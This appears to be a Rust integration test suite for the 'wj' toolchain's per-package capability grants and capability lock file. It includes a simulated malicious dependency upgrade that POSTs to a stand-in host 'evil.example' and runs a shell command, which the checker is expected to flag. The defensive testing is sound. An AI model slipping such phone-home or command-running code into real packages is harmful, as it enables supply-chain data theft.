// consumes: src/ir/effect_facts/{packages,lock}.rs, src/check/effects.rs, src/interpreter/caps.rs, src/cli/caps.rs
//! Per-package grants and the capability lock file (ADR-0021 stage E2), end to end through the `wj` binary:
//! the application and each dependency are checked against their own grants, an upgrade that adds an effect is
//! an escalation until `wj caps approve`, and at run time a call is attributed to the package that contains it
//! (closures to where they are written), unless the dependency was *handed* a capability value.

use std::path::{Path, PathBuf};
use std::process::Command;

fn wj(args: &[&str], dir: &Path) -> (i32, String) {
    let out = Command::new(env!("CARGO_BIN_EXE_wj")).args(args).current_dir(dir).output().expect("run wj");
    let text = format!("{}{}", String::from_utf8_lossy(&out.stdout), String::from_utf8_lossy(&out.stderr));
    (out.status.code().unwrap_or(-1), text)
}

/// A fresh fixture: `app/` depending on `json5/` (path dependency), plus `app/data/ok.txt` and `secret.txt`.
fn fixture(app_caps: &str, dep_lib: &str, app_main: &str) -> PathBuf {
    static N: std::sync::atomic::AtomicUsize = std::sync::atomic::AtomicUsize::new(0);
    let root = std::env::temp_dir().join(format!("wj_pkgs_{}_{}", std::process::id(), N.fetch_add(1, std::sync::atomic::Ordering::SeqCst)));
    let _ = std::fs::remove_dir_all(&root);
    for d in ["app/src", "app/data", "json5/src"] {
        std::fs::create_dir_all(root.join(d)).unwrap();
    }
    let root = std::fs::canonicalize(&root).unwrap();
    let w = |p: &str, t: &str| std::fs::write(root.join(p), t).unwrap();
    w("app/wj.toml", &format!("[package]\nname = \"app\"\nversion = \"0.1.0\"\n\n[dependencies]\njson5 = {{ path = \"../json5\" }}\n\n{app_caps}"));
    w("json5/wj.toml", "[package]\nname = \"json5\"\nversion = \"0.2.0\"\n");
    w("json5/src/lib.wj", dep_lib);
    w("app/src/main.wj", app_main);
    w("app/data/ok.txt", "ok-text");
    w("app/secret.txt", "TOP-SECRET");
    root.join("app")
}

const LIB_READS: &str = "use std::fs\npub fn load(path: string) -> string {\n    fs::read_to_string(path).unwrap_or(\"\")\n}\npub fn size(s: string) -> int {\n    s.len()\n}\n";
const MAIN_USES_LIB: &str = "use json5\nfn main() {\n    println(\"${json5::size(\"abc\")}\")\n}\n";

#[test]
fn a_dependency_effect_without_a_grant_is_reported_naming_the_dependency() {
    let app = fixture("[capabilities]\nfs.read = [\"./**\"]\n", LIB_READS, MAIN_USES_LIB);
    let (code, out) = wj(&["check", "."], &app);
    assert_eq!(code, 1, "{out}");
    assert!(out.contains("WJ0040"), "{out}");
    assert!(out.contains("effect `fs.read` is not granted to dependency `json5`"), "{out}");
    assert!(out.contains("json5::load -> fs::read_to_string"), "the chain starts in the dependency: {out}");
    assert!(out.contains("wj caps approve"), "the fix names the command: {out}");
}

#[test]
fn the_applications_grant_is_not_the_dependencys() {
    // the app may read everything; the dependency still has nothing
    let app = fixture("[capabilities]\nfs.read = true\n", LIB_READS, MAIN_USES_LIB);
    let (code, out) = wj(&["check", "."], &app);
    assert_eq!(code, 1, "{out}");
    assert!(out.contains("dependency `json5`"), "{out}");
}

#[test]
fn approve_records_the_effects_and_a_later_escalation_is_reported() {
    let app = fixture("[capabilities]\nfs.read = [\"./**\"]\n", LIB_READS, MAIN_USES_LIB);
    let (code, out) = wj(&["caps", "show", "."], &app);
    assert_eq!(code, 0, "{out}");
    assert!(out.contains("json5: fs.read(*)") && out.contains("no lock file"), "{out}");
    let (code, out) = wj(&["caps", "approve", "."], &app);
    assert_eq!(code, 0, "{out}");
    let lock = std::fs::read_to_string(app.join(".wj-capabilities.lock")).unwrap();
    assert!(lock.contains("\"fs.read(*)\"") && lock.contains("\"schema_version\": 2"), "{lock}");
    let (code, out) = wj(&["check", "."], &app);
    assert_eq!(code, 0, "locked effects are allowed: {out}");

    // the dependency is upgraded and now also runs a program and talks to a host
    let upgraded = format!("{LIB_READS}pub fn phone_home() -> bool {{\n    http::post(\"http://evil.example/c\", \"x\").is_ok()\n}}\npub fn shell() -> bool {{\n    process::run(\"id\").is_ok()\n}}\n");
    std::fs::write(app.join("../json5/src/lib.wj"), format!("use std::http\nuse std::process\n{upgraded}")).unwrap();
    let (code, out) = wj(&["check", "."], &app);
    assert_eq!(code, 1, "an upgrade that adds effects must not pass: {out}");
    assert!(out.contains("net.connect") && out.contains("process"), "both new effects are named: {out}");
    assert!(out.contains("dependency `json5`"), "{out}");
    let (_, shown) = wj(&["caps", "show", "."], &app);
    assert!(shown.contains("not in the lock"), "{shown}");
    // approving the new set makes check pass again
    assert_eq!(wj(&["caps", "approve", "."], &app).0, 0);
    assert_eq!(wj(&["check", "."], &app).0, 0);
}

#[test]
fn an_explicit_dependency_grant_allows_exactly_that() {
    let caps = "[capabilities]\nfs.read = [\"./data/**\"]\n\n[capabilities.dependencies.json5]\nfs.read = [\"./data/**\"]\n";
    let app = fixture(caps, LIB_READS, MAIN_USES_LIB);
    let (code, out) = wj(&["check", "."], &app);
    assert_eq!(code, 0, "computed paths are decided at run time: {out}");
}

#[test]
fn at_run_time_a_dependency_is_held_to_its_own_grant() {
    // static check passes (the path is computed); the dependency reads a file outside its ./data/** grant
    let caps = "[capabilities]\nfs.read = [\"./**\"]\n\n[capabilities.dependencies.json5]\nfs.read = [\"./data/**\"]\n";
    let main = "use json5\nfn main() {\n    println(\"inside: ${json5::load(\"data/ok.txt\")}\")\n    println(\"outside: ${json5::load(\"secret.txt\")}\")\n}\n";
    let app = fixture(caps, LIB_READS, main);
    let (code, out) = wj(&["run", "--interpret", "."], &app);
    assert_eq!(code, 126, "{out}");
    assert!(out.contains("inside: ok-text"), "the granted read worked: {out}");
    assert!(out.contains("capability denied: fs.read(./secret.txt) (dependency `json5`)"), "{out}");
    assert!(!out.contains("TOP-SECRET"), "{out}");
}

#[test]
fn a_closure_keeps_the_grant_of_the_package_that_wrote_it() {
    // the dependency only calls the callback; the callback (written in the app) reads an app-granted file
    let lib = "pub fn apply(f: fn() -> string) -> string {\n    f()\n}\n";
    let main = "use json5\nuse std::fs\nfn main() {\n    let text = json5::apply(|| fs::read_to_string(\"data/ok.txt\").unwrap_or(\"\"))\n    println(\"got ${text}\")\n}\n";
    let app = fixture("[capabilities]\nfs.read = [\"./data/**\"]\n", lib, main);
    let (code, out) = wj(&["run", "--interpret", "."], &app);
    assert_eq!(code, 0, "{out}");
    assert!(out.contains("got ok-text"), "{out}");
}

#[test]
fn a_dependency_handed_a_capability_value_needs_no_ambient_grant_but_stays_inside_the_value() {
    let lib = "use std::cap\npub fn read_via(files: cap::Fs, path: string) -> string {\n    files.read_to_string(path).unwrap_or(\"\")\n}\n";
    let main = "use json5\nuse std::cap\nfn main() {\n    let files = cap::fs().under(\"data\").read_only()\n    println(\"inside: ${json5::read_via(files, \"data/ok.txt\")}\")\n    println(\"outside: ${json5::read_via(files, \"secret.txt\")}\")\n}\n";
    let app = fixture("[capabilities]\nfs.read = [\"./**\"]\nfs.write = [\"./out/**\"]\n", lib, main);
    let (code, out) = wj(&["run", "--interpret", "."], &app);
    assert_eq!(code, 126, "{out}");
    assert!(out.contains("inside: ok-text"), "the dependency read through the value with no grant of its own: {out}");
    assert!(out.contains("capability denied: fs.read(./secret.txt)"), "{out}");
    assert!(out.contains("the capability value you were given"), "{out}");
    assert!(!out.contains("TOP-SECRET"), "{out}");
}
